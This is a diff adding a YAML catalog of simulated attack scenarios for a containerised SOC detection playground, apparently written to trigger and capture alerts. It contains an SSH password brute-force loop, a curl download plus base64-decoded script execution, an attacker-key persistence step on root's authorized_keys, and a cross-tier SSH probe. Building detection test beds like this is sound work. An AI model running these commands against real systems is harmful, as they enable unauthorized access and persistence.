@@ -1,0 +1,131 @@
+# Attack scenario catalog — batch 10 (docs/playground-environment-v2.md §Attack-simulation surface).
+#
+# Each scenario is a parameterized command sequence dispatched from a source
+# host container against a target host. The runner (runner.py) executes
+# steps via `docker --context soc-playground exec`, captures start/end
+# timestamps + exit codes + truncated stdout/stderr per step, and writes a
+# run manifest to attacks/runs/<run_id>/meta.json — raw material for the
+# fixture-capture pass (batch 10b).
+#
+# Schema (per scenario):
+#   id: unique slug, also the run_id prefix + seed axis.
+#   category: auth-metadata | execution | data-access
+#   description: short prose for catalog listing.
+#   source_host: default docker container to dispatch from.
+#   source_user: default identity (must exist on source_host — seeded by
+#                hosts/base/seed-users.py from realm.yaml + inventory.yaml).
+#   target_host: host the attack aims at (shows up as hostname in telemetry).
+#   default_intensity: default for the ${intensity} placeholder + repeat count.
+#   steps: list of command steps. Each step:
+#     cmd: shell command. Template placeholders substituted before exec:
+#            ${host}      → target_host (same as scenario.target_host)
+#            ${target}    → target_host (alias; clearer when reading)
+#            ${user}      → resolved source_user
+#            ${iteration} → 0-indexed repeat counter
+#            ${intensity} → resolved intensity
+#     source_host: per-step override of scenario default.
+#     source_user: per-step override (root means no -u flag on docker exec).
+#     repeat: positive integer, or the literal string "${intensity}".
+#     delay_s_between: seconds to sleep between repeats (skipped after last).
+#     allow_fail: if true, non-zero rc does not abort the scenario.
+#
+# Reproducibility: runner hashes (scenario.id, seed, step_index, iteration)
+# to seed a per-step PRNG — same seed + same catalog → same dispatches.
+#
+# IMPORTANT: run scenarios with baseline activity disabled
+# (V2_BASELINE_ENABLED=false + compose up -d --force-recreate <hosts>) so
+# synthetic benign traffic doesn't contaminate the fixture-capture window.
+
+scenarios:
+
+  - id: ssh-brute-force-canary
+    category: auth-metadata
+    description: >
+      Compromised office workstation hammers canary-1's SSH with wrong
+      passwords from a non-privileged identity — classic rule-5710
+      (SSH invalid-user / auth-failure) territory. The signal is the
+      burst of failed auth events on canary-1's sshd.
+    source_host: office-ws-1
+    source_user: dev.dana
+    target_host: canary-1
+    default_intensity: 8
+    steps:
+      - cmd: |
+          for pw in hunter2 password123 letmein admin secret qwerty; do
+            sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
+              -o ConnectTimeout=3 -o PreferredAuthentications=password \
+              -o NumberOfPasswordPrompts=1 \
+              root@${target} true 2>&1 | head -1 || true
+          done
+        repeat: "${intensity}"
+        delay_s_between: 4
+        allow_fail: true
+
+  - id: living-off-the-land
+    category: execution
+    description: >
+      Foothold on canary-1 runs a `curl | bash` chain plus a base64-decoded
+      shell payload — exercises Falco's execution-lineage rules (shell
+      spawned from non-shell parent, curl-to-bash piping, decoded script
+      execution).
+    source_host: canary-1
+    source_user: root
+    target_host: canary-1
+    default_intensity: 1
+    steps:
+      - cmd: |
+          curl -fsS http://web-1/ -o /tmp/fetched_${iteration}.sh 2>&1 || true
+          # Not actually executing web-1's HTML as a script — just producing
+          # the download+read-from-/tmp signal the telemetry cares about.
+          bash -c "cat /tmp/fetched_${iteration}.sh | head -3" 2>&1 || true
+        repeat: "${intensity}"
+        allow_fail: true
+      - cmd: |
+          echo "IyEvYmluL2Jhc2gKZWNobyAicGxheWdyb3VuZCBhdHRhY2stc2ltIHJlYWNoZWQ6ICQobG9jYWx0aW1lKSIK" \
+            | base64 -d > /tmp/payload_${iteration}.sh
+          bash /tmp/payload_${iteration}.sh
+        repeat: 1
+        allow_fail: true
+
+  - id: persistence-authorized-keys
+    category: execution
+    description: >
+      Foothold on canary-1 appends an attacker SSH public key to
+      /root/.ssh/authorized_keys — classic persistence via credential
+      installation. Produces file-integrity (rule-550) + syscall (Falco
+      write-below-etc / write-sensitive-file) signals.
+    source_host: canary-1
+    source_user: root
+    target_host: canary-1
+    default_intensity: 1
+    steps:
+      - cmd: |
+          mkdir -p /root/.ssh && chmod 700 /root/.ssh
+          ts=$(date +%s)
+          echo "ssh-rsa AAAAB3NzaC1yc2EAAAAD_fake_key_${iteration}_${ts}_attacker attacker@elsewhere" \
+            >> /root/.ssh/authorized_keys
+          chmod 600 /root/.ssh/authorized_keys
+          ls -la /root/.ssh/authorized_keys
+        repeat: "${intensity}"
+        delay_s_between: 2
+
+  - id: cross-tier-ssh-probe
+    category: data-access
+    description: >
+      Compromised office workstation attempts SSH to db-1 — office-ws has
+      trust_edges_out: [] in inventory.yaml, so any auth attempt crosses a
+      tier boundary that baseline traffic never crosses. The signal is
+      cross-credential-anomaly regardless of whether auth succeeds.
+    source_host: office-ws-1
+    source_user: dev.dana
+    target_host: db-1
+    default_intensity: 4
+    steps:
+      - cmd: |
+          sshpass -p changeme ssh -o StrictHostKeyChecking=no \
+            -o ConnectTimeout=3 -o NumberOfPasswordPrompts=1 \
+            dev.dana@${target} "id; hostname; ls /var/lib/postgresql 2>&1 | head -3" \
+            2>&1 | head -5 || true
+        repeat: "${intensity}"
+        delay_s_between: 6
+        allow_fail: true
